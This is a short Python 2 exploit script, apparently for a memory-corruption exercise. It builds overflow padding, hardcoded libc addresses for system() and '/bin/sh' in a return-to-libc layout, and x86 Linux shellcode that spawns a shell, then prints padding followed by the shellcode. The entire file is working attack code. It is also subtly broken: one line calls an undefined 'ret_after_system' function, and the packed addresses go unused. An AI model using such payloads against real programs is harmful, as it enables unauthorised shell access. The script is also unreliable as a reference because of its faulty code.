import struct 
import time


str1 = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH\n" 
str2 = "IIIIJJJJK"

bin_sh = struct.pack("I", 0xb7f8cc58)
ret_after_system("I", 0xb7e5ebe0)
system = struct.pack("I", 0xb7e6b060)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\n";


print str1
time.sleep(2)
print str2 + shellcode
